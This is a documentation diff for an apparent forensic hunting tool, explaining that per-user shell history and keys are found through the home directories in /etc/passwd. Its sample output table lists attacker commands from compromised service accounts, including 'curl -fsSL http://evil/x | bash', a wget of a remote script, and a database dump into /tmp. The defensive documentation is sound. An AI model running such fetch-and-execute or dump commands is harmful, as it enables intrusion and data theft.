@@ -569,6 +569,32 @@ used as the anchor, and the report says so rather than quietly picking one.
 
 ## Hunting
 
+### Per-user artifacts follow /etc/passwd
+
+Shell history, `authorized_keys` and private keys are looked for in **every
+home directory `/etc/passwd` declares**, not under `/home/*`. On a server that
+matters: `www-data` lives in `/var/www`, `postgres` in `/var/lib/postgresql`,
+an application account in `/opt/<app>` or `/srv/<service>` — and a compromised
+service account is exactly the one whose history is worth reading, because it
+is the account a web shell runs as.
+
+```
+user       file                                  command
+www-data   /var/www/.bash_history                wget http://198.51.100.9/s.sh -O /tmp/s.sh
+postgres   /var/lib/postgresql/.bash_history     psql -c "copy users to /tmp/dump"
+appsvc     /opt/app/.bash_history                curl -fsSL http://evil/x | bash
+deploy     /srv/deploy/.zsh_history              ssh-keygen -f /tmp/k
+```
+
+`/root` and `/home/*` are still searched whatever `passwd` says. A home
+directory with no account behind it is not an absence of evidence — it is what
+an account deleted after the fact leaves behind, and the history in it is the
+reason to care.
+
+The owner column comes from the longest home that fits the path, because homes
+nest: with both `/var` and `/var/www` in `passwd`, a file under `/var/www`
+belongs to the account that lives there.
+
 ### Every indicator, in one table
 
 `IOCS` is the list of indicators this run extracted — addresses, hashes,
